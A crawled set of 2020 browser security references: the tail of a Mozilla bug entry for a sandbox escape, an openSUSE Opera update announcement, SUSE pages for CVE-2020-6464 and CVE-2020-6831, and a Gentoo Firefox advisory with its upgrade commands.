Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage] → [reporter-external] [client-bounty-form][post-critsmash-triage][adv-main76+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a29474363_428608)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form][post-critsmash-triage][adv-main76+] → [reporter-external] [client-bounty-form][post-critsmash-triage][adv-main76+][adv-ESR68.8+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1554110#c40)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9144310)
— [Details](attachment.cgi?id=9144310&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a29527245_1689)• 5 years ago |

Keywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a29547130_428608)• 5 years ago |

Alias: CVE-2020-12389

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1554110#c41)• 5 years ago |
|  | |

Same root cause as [bug 1618911](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape"), different exploit strategy. Also opening up.

Group: core-security-release

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a76148275_578488)• 3 years ago |

Keywords: [csectype-sandbox-escape](/buglist.cgi?keywords=csectype-sandbox-escape&resolution=---)

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a158397209_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1554110&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Bob Owen (:bobowen)](/user_profile?user_id=458623)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from packetstormsecurity.com_512a77be_20250119_122046.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from lists.opensuse.org_5325ba90_20250119_122045.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/URGAZZH235MACHZERPNLFFODQWELZSF5/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/URGAZZH235MACHZERPNLFFODQWELZSF5/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/URGAZZH235MACHZERPNLFFODQWELZSF5/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/URGAZZH235MACHZERPNLFFODQWELZSF5/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/URGAZZH235MACHZERPNLFFODQWELZSF5/#URGAZZH235MACHZERPNLFFODQWELZSF5)

# [security-announce] openSUSE-SU-2020:0917-1: important: Security update for opera

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

2 Jul
2020

2 Jul
'20

22:18

openSUSE Security Update: Security update for opera
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2020:0917-1
Rating: important
References:
Cross-References: CVE-2020-6464 CVE-2020-6831
Affected Products:
openSUSE Leap 15.2:NonFree
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes two vulnerabilities is now available.
Description:
This update for opera fixes the following issues:
Opera was updated to version 68.0.3618.104
- CHR-7909 Update chromium on desktop-stable-81-3618 to 81.0.4044.138
- CVE-2020-6831, CVE-2020-6464
- DNA-85609 [Mac] Tabs shrinking & disappearing
- DNA-85629 Crash at opera::DownloadButtonPanel::ShouldShowCancelButton()
- DNA-85669 Add mocking of AddressDropdownModel in AddressBarControllerTest
- DNA-85678 Wrong badge icon on pages with mixed content on
desktop-stable-81-3618
- DNA-85820 Flags are blue in default [D] state after restart
- DNA-85822 Full screen snap on pkobp.pl
- DNA-86077 Problem to upload .JPG file as an wallpaper
- DNA-86165 Downloads list doesn’t returns to its original state after
clearing search filter
- DNA-86236 [Mac] Plus button click area too small
- DNA-86241 X tab button is not visible
- DNA-86217 Fix performance issue with Background Worker
Patch Instructions:
To install this openSUSE Security Update use the SUSE recommended installation methods
like YaST online\_update or "zypper patch".
Alternatively you can run the command listed for your product:
- openSUSE Leap 15.2:NonFree:
zypper in -t patch openSUSE-2020-917=1
Package List:
- openSUSE Leap 15.2:NonFree (x86\_64):
opera-68.0.3618.104-lp152.2.6.1
References:
<https://www.suse.com/security/cve/CVE-2020-6464.html>
<https://www.suse.com/security/cve/CVE-2020-6831.html>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/URGAZZH235MACHZERPNLFFODQWELZSF5/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/URGAZZH235MACHZERPNLFFODQWELZSF5/#URGAZZH235MACHZERPNLFFODQWELZSF5)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from www.suse.com_fd74e48b_20250119_135950.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2020-6464.html)
[English](https://www.suse.com/security/cve/CVE-2020-6464.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2020-6464.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2020-6464.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2020-6464.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2020-6464.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2020-6464.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2020-6464.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2020-6464

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2020-6463.html) [[Index]](index.html) [[Next]](CVE-2020-6465.html)

### Upstream information

[CVE-2020-6464 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6464)

#### Description

Type confusion in Blink in Google Chrome prior to 81.0.4044.138 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [important](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 6.8 |
| Vector | AV:N/AC:M/Au:N/C:P/I:P/A:P |
| Access Vector | Network |
| Access Complexity | Medium |
| Authentication | None |
| Confidentiality Impact | Partial |
| Integrity Impact | Partial |
| Availability Impact | Partial |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 8.8 |
| Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H |
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | Required |
| Scope | Unchanged |
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| CVSSv3 Version | 3.1 |

SUSE Bugzilla entry: [1171247](https://bugzilla.suse.com/show_bug.cgi?id=1171247) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [openSUSE-SU-2020:0620-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/JZWG67WLLGB24KQGFWLQCE4EILVX3YVP/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0648-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/MZ2SKF2KGZ6HPXPWQGVRGGOFHMAFBYGT/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0709-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/R4ZOZMMUQJP7KX3R3SO652IBWIRTED2C/), published Thu Dec 7 12:55:39 2023
* [openSUSE-SU-2020:0917-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/URGAZZH235MACHZERPNLFFODQWELZSF5/), published Thu Dec 7 12:55:40 2023

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE Package Hub 15 SP1 | * `chromedriver >= 81.0.4044.138-bp151.3.82.2` * `chromium >= 81.0.4044.138-bp151.3.82.2` | Patchnames: openSUSE-2020-648 |
| openSUSE Leap 15.1 | * `chromedriver >= 81.0.4044.138-lp151.2.88.1` * `chromium >= 81.0.4044.138-lp151.2.88.1` | Patchnames: openSUSE-2020-620 |
| openSUSE Leap 15.1 NonFree | * `opera >= 68.0.3618.104-lp151.2.18.1` | Patchnames: openSUSE-2020-709 |
| openSUSE Leap 15.2 | * `chromium >= 83.0.4103.97-lp152.1.1` | Patchnames: openSUSE Leap 15.2 GA chromium-83.0.4103.97-lp152.1.1 |
| openSUSE Leap 15.2 NonFree | * `opera >= 68.0.3618.104-lp152.2.6.1` | Patchnames: openSUSE-2020-917 |
| openSUSE Leap 15.3 | * `chromium >= 90.0.4430.212-bp153.1.1` | Patchnames: openSUSE Leap 15.3 GA chromium-90.0.4430.212-bp153.1.1 |
| openSUSE Leap 15.4 | * `chromium >= 101.0.4951.64-bp154.1.2` | Patchnames: openSUSE Leap 15.4 GA chromium-101.0.4951.64-bp154.1.2 |
| openSUSE Tumbleweed | * `chromedriver >= 93.0.4577.82-1.1` * `chromium >= 93.0.4577.82-1.1` * `ungoogled-chromium >= 113.0.5672.92-1.1` * `ungoogled-chromium-chromedriver >= 113.0.5672.92-1.1` | Patchnames: openSUSE-Tumbleweed-2024-10681openSUSE-Tumbleweed-2024-12948 |

---

### SUSE Timeline for this CVE

CVE page created: Thu May 7 10:49:36 2020

CVE page last modified: Tue Sep 3 19:15:31 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from security.gentoo.org_cde19d5a_20250119_122048.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **202005-04**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.8.0** |
| Unaffected versions | >= **68.8.0** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the CVE identifiers referenced below for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process, an information leak or a Denial of Service
condition.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-68.8.0"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-68.8.0"

```
### References

* [CVE-2020-12387](https://nvd.nist.gov/vuln/detail/CVE-2020-12387)
* [CVE-2020-12392](https://nvd.nist.gov/vuln/detail/CVE-2020-12392)
* [CVE-2020-12394](https://nvd.nist.gov/vuln/detail/CVE-2020-12394)
* [CVE-2020-12395](https://nvd.nist.gov/vuln/detail/CVE-2020-12395)
* [CVE-2020-12396](https://nvd.nist.gov/vuln/detail/CVE-2020-12396)
* [CVE-2020-6831](https://nvd.nist.gov/vuln/detail/CVE-2020-6831)
* [MFSA-2020-17](https://www.mozilla.org/en-US/security/advisories/mfsa2020-17/)

**Release date**

May 12, 2020

**Latest revision**

May 12, 2020: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [721090](https://bugs.gentoo.org/show_bug.cgi?id=721090)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.suse.com_216455c3_20250119_135950.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2020-6831.html)
[English](https://www.suse.com/security/cve/CVE-2020-6831.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2020-6831.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2020-6831.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2020-6831.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2020-6831.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2020-6831.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2020-6831.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2020-6831

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2020-6829.html) [[Index]](index.html) [[Next]](CVE-2020-6851.html)

